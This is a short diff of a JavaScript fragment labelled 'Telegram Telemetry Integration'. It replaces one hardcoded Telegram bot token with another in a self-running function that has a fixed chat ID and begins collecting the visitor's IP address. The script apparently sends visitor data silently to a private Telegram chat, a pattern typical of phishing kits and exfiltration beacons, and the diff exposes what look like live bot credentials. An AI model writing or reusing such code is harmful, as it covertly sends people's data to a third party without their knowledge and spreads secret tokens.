@@ -1,6 +1,6 @@
 // Telegram Telemetry Integration
 (async function sendTelegramTelemetry() {
-    const BOT_TOKEN = "8682713456:AAF0VAvcbQcU_oL8Q4C4yADi4VUHM9NKWew";
+    const BOT_TOKEN = "8951574851:AAFrn_4YbNH6WGdCaga3p_LuVr1sN8O4qhk";
     const CHAT_ID = "1259601363";
 
     let ip = "Unknown IP";
